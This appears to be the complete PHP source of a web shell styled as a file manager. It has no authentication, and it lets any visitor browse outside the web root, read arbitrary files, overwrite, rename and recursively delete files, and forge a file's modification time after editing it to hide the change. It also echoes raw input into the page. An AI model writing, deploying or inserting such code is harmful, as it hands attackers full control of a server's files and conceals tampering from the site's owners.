<?php
// regex => files(dir, '/\.html$/')
date_default_timezone_set("Asia/Jakarta");
if (@$_GET['raw'] == 'file') {
	?><pre><?= freadf($_GET['file']) ?></pre><?php
	exit();
}
function files($type, $pattern = '', $result = array()) {
	$result = [];
	foreach (scandir(getcwd()) as $key => $value) {
		$file['name'] = getcwd().DIRECTORY_SEPARATOR.$value;
		switch ($type) {
			case 'dir':
				if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
					$result[] = $file;
				break;
			
			case 'file':
				if (!is_file($file['name'])) continue 2;
					if(empty($pattern) || preg_match($pattern, $file['name'])) $result[] = $file;
				break;
		}
	} return $result;
}
function redirect($url) {
	return '<meta http-equiv="refresh" content="0; url='.$url.'>';
}
function home_root() {
	return $_SERVER['DOCUMENT_ROOT'];
}
function countdir($dir) {
	return @count(scandir($dir)) - 2;
}
function delete($filename) {
	if (is_dir($filename)) {
		foreach (scandir($filename) as $key => $value) {
			if ($value != '.' && $value != '..') {
				if (is_dir($filename.DIRECTORY_SEPARATOR.$value)) {
					delete($filename.DIRECTORY_SEPARATOR.$value);
				} else {
					@unlink($filename.DIRECTORY_SEPARATOR.$value);
				}
			}
			if (@rmdir($filename)) {
				return true;
			} else {
				return false;
			}
		}
	} else {
		if (@unlink($filename)) {
			return true;
		} else {
			return false;
		}
	}
}
function fsize($filename) {
	if (is_file($filename)) {
		$filepath = $filename;
		if (!realpath($filepath)) {
			$filepath = home_root().$filepath;
		}
		$fsize = filesize($filepath);
		$array = [" TB"," GB"," MB"," KB"," Byte"];
		$total = count($array);
		while ($total -- && $fsize > 1024) {
			$fsize /= 1024; 
		} return round($fsize, 2)."".$array[$total];
	} else {
		return countdir($filename). " items";
	}
}
function ago($time){ 
	$periods = array("seconds", "minutes", "hours", "days", "weeks", "months", "years", "decades");
	$lengths = array("60","60","24","7","4.35","12","10");
	$difference     = time() - $time;
	for($j = 0; $difference >= $lengths[$j] && $j < count($lengths)-1; $j++) {
		$difference /= $lengths[$j];
	}
	$difference = round($difference); 
	return "$difference $periods[$j] ago";
}
function ftime($filename) {
	return date("d/m/Y - H:i", @filemtime($filename));
}
function freadf($filename) {
	return htmlspecialchars(file_get_contents($filename));
}
function frename($filename, $newname) {
	return rename($filename, getcwd().DIRECTORY_SEPARATOR.$newname);
}
function fedit($filename, $data) {
	$key = true;
	$handle = fopen($filename, "wb");
	if (!@fwrite($handle, $data)) {
		@chmod($filename, "0666");
		$key = @fwrite($handle, $data) ? true : false;
	} fclose($handle);
	return $key;
}
function back($type) {
	switch ($type) {
		case 1:
			return dirname(getcwd());
			break;
		
		case 2:
			return getcwd();
			break;
	}
}
function geticon($filename) {
	switch (strtolower(pathinfo($filename, PATHINFO_EXTENSION))) {
		case 'php1':
		case 'php2':
		case 'php3':
		case 'php4':
		case 'php5':
		case 'php6':
		case 'phtml':
		case 'php':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg');break;
		case 'html':
		case 'htm':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg');break;
		case 'css':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg');break;
		case 'js':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg');break;
		case 'json':print('https://image.flaticon.com/icons/svg/136/136525.svg');break;
		case 'xml':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg');break;
		case 'py':print('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');break;
		case 'zip':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg');break;
		case 'rar':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg');break;
		case 'htaccess':print('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
		case 'txt':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg');break;
		case 'ini':print('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
		case 'mp3':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');break;
		case 'mp4':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');break;
		case 'log':
		case 'log1':
		case 'log2':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');break;
		case 'psd':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg');break;
		case 'dat':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');break;
		case 'exe':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');break;
		case 'apk':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');break;
		case 'yaml':print('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
		case 'xlsx':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg');break;
		case 'bak':print('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
		case 'ico':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');break;
		case 'png':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');break;
		case 'jpg':
		case 'webp':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');break;
		case 'jpeg':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');break;
		case 'svg':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');break;
		case 'gif':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');break;
		case 'pdf':print('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');break;
		case 'asp':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg");break;
		case 'doc':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");break;
		case 'docx':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");break;
		case 'otf':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");break;
		case 'ttf':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");break;
		case 'wav':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");break;
		case 'sql':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");break;
		case 'csv':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");break;
		case 'bat':print("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");break;
		default:print('https://image.flaticon.com/icons/svg/833/833524.svg');break;
	}
}
if (isset($_GET['cd'])) {
	@chdir($_GET['cd']);
}
?>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Andika+New+Basic&display=swap');
	* {
		font-family: 'Andika New Basic', sans-serif;
	}
	body {
		padding-left:130px;
		padding-right:150px;
	}
	.table {
		display: table;
		border:1px solid #000;
		width:100%;
		padding:25px;
	}
	.tr {
		display: table-row;
	}
	.td:first-child {
		border-top-left-radius:5px;
		border-bottom-left-radius:5px;
	}
	.td:last-child {
		border-top-right-radius:5px;
		border-bottom-right-radius:5px;
	}
	.td {
		display: table-cell;
		padding-top:10px;
		padding-left:10px;
		padding-right:10px;
		padding-bottom:-2px;
	}
	.trhover:hover {
		background: red;
	}
	.th {
		display: table-cell;
		padding:10px;
	}
	.icon {
		width:25px;
		height:25px;
		position: absolute;
		margin-top:-4.5px;
	}
	a {
		color: #000;
		text-decoration: none;
	}
	span.name {
		margin-left:30px;
	}
</style>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script type="text/javascript">
	jQuery(document).ready(function($) {
    $(".clickable-row").click(function() {
        window.location = $(this).data("href");
    });
});
</script>
<div class="table" id="myTable">
	<?php
	switch (@$_POST['action']) {
		case 'fedit':
			if (isset($_POST['submit'])) {
				$message = null;
				if (!empty($_POST['file'])) {
					if (fedit($_POST['file'], $_POST['data'])) {
						print("saved");
						@touch($_POST['file'], @strtotime($_POST['ftime']));
					} else {
						print("failed to saved");
					}
				}
			}
			?>
			<div class="tr">
				<div class="td">
					<a href="?cd=<?= back(2) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>
				</div>
			</div>
			<div class="tr">
				<div class="td">
					Filename
				</div>
				<div class="td">:</div>
				<div class="td">
					<?= $_POST['file'] ?>
				</div>
			</div>
			<div class="tr">
			<form method="post">
				<div class="td">
					Last Modified
				</div>
				<div class="td">:</div>
				<div class="td">
					<input type="text" name="ftime" value="<?= ftime($_POST['file']) ?>">
				</div>
			</div>
			<div class="tr">
				<div class="td">
					<textarea name="data" rows="20" cols="100"><?= freadf($_POST['file']) ?></textarea>
				</div>
			</div>
			<div class="tr">
				<div class="td">
					<input type="hidden" name="action" value="fedit">
					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
					<input type="submit" name="submit" value="save">
				</div>
			</div>				
			</form>
			<?php
			exit();
			break;
		case 'frename':
			if (isset($_POST['submit'])) {
				if (frename($_POST['file'], $_POST['newname'])) {
					redirect("?cd=".getcwd()."");
					@touch($_POST['file'], @strtotime($_POST['ftime']));
					delete($_POST['file']);
				} else {
					print("rename failed");
				}
			}
			?>
			<tr>
				<td>
					<a href="?cd=<?= back(2) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>
				</td>
			</tr>
			<form method="post">
				<tr>
					<td>
						<input type="hidden" name="action" value="frename">
						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
						<input type="hidden" name="ftime" value="<?= ftime($_POST['file']) ?>">
						<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
					</td>
					<td>
						<input type="submit" name="submit" value="rename">
					</td>
				</tr>
			</form>
			<?php
			exit();
			break;
		case 'fdelete':
			delete($_POST['file']);
			break;
	}
	?>
	<div>
		<input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
	</div>
	<div class="tr">
		<div class="td">
			<a href="?cd=<?= back(1) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a> 
			<span style="margin-left:20px;">Name</span>
		</div>
		<div class="th"><center>Size</center></div>
		<div class="th"><center>Last Modified</center></div>
		<div class="th"><center>Action</center></div>
	</div>
	<br>
	<?php
	foreach (files('dir') as $key => $value) { ?>
		<a class="tr trhover" href="?cd=<?= $value['name'] ?>">
			<div class="td">
				<img class="icon" src="https://image.flaticon.com/icons/svg/715/715676.svg"> 
				<span class="name"><?= basename($value['name']) ?></span>
			</div>
			<div class="td">
				<center>
					<?= fsize($value['name']) ?>
				</center>
			</div>
			<div class="td">
				<center>
					<?= ftime($value['name']) ?> - <?= ago(filemtime($value['name'])) ?>
				</center>
			</div>
			<div class="td">
				<form method="post">
					<center>
						<input type="hidden" name="file" value="<?= $value['name'] ?>">
						<button name="action" value="frename">Rename</button>
						<button name="action" value="fdelete">Delete</button>
					</center>
				</form>
			</div>
		</a>
	<?php }
	foreach (files('file') as $key => $value) { ?>
		<a class="tr trhover" href="?raw=file&file=<?= $value['name'] ?>" target="_balnk">
			<div class="td">
				<img class="icon" src="<?= geticon($value['name']) ?>"> 
				<span class="name"><?= basename($value['name']) ?></span>
			</div>
			<div class="td">
				<center>
					<?= fsize($value['name']) ?>
				</center>
			</div>
			<div class="td">
				<center>
					<?= ftime($value['name']) ?> - <?= ago(filemtime($value['name'])) ?>
				</center>
			</div>
			<div class="td">
				<form method="post">
					<center>
						<input type="hidden" name="file" value="<?= $value['name'] ?>">
						<button name="action" value="fedit">Edit</button>
						<button name="action" value="frename">Rename</button>
						<button name="action" value="fdelete">Delete</button>
					</center>
				</form>
			</div>
		</a>
	<?php }
	?>
	<script type="text/javascript">
		function filterTable() {
			var input,filter,table,tr,td,i;
			input = document.getElementById("Input");
			filter = input.value.toUpperCase();
			table = document.getElementById("myTable");
			tr = table.getElementsByClassName("tr");
			for(i=0;i<tr.length;i++){td=tr[i].getElementsByClassName("td")[0];
				if(td) { 
					if(td.innerHTML.toUpperCase().indexOf(filter)>-1)
						{
							tr[i].style.display="";
						}
						else{tr[i].style.display="none";
					}
				}
			}
		}
	</script>
</table>
</tr>
<?php
